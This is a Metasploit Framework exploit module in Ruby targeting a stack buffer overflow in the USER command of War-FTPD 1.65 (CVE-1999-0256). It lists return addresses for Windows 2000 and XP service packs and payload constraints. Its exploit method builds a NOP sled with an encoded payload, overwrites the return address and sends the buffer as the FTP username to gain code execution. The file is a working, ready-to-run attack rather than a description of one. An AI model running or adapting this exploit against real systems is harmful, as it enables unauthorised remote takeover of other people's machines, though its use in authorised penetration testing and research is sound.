##
# $Id: warftpd_165_user.rb 9669 2010-07-03 03:13:45Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'War-FTPD 1.65 Username Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow found in the USER command
				of War-FTPD 1.65.
			},
			'Author'         => 'Fairuzan Roslan <riaf [at] mysec.org>',
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 9669 $',
			'References'     =>
				[
					[ 'CVE', '1999-0256'],
					[ 'OSVDB', '875'    ],
					[ 'BID', '10078'	],
					[ 'URL', 'http://lists.insecure.org/lists/bugtraq/1998/Feb/0014.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process'
				},
			'Payload'        =>
				{
					'Space'    => 424,
					'BadChars' => "\x00\x0a\x0d\x40",
					'StackAdjustment' => -3500,
					'Compat'   =>
						{
							'ConnectionType' => "-find"
						}
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Target 0
					[
						'Windows 2000 SP0-SP4 English',
						{
							'Ret'      => 0x750231e2 # ws2help.dll
						},
					],
					# Target 1
					[
						'Windows XP SP0-SP1 English',
						{
							'Ret'      => 0x71ab1d54 # push esp, ret
						}
					],
					# Target 2
					[
						'Windows XP SP2 English',
						{
							'Ret'      => 0x71ab9372 # push esp, ret
						}
					],
					# Target 3
					[
						'Windows XP SP3 English',
						{
							'Ret'      => 0x71ab2b53 # push esp, ret
						}
					]
				],
			'DisclosureDate' => 'Mar 19 1998'))
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")

		buf          = make_nops(600) + payload.encoded
		buf[485, 4]  = [ target.ret ].pack('V')

		send_cmd( ['USER', buf] , false )

		handler
		disconnect
	end

end
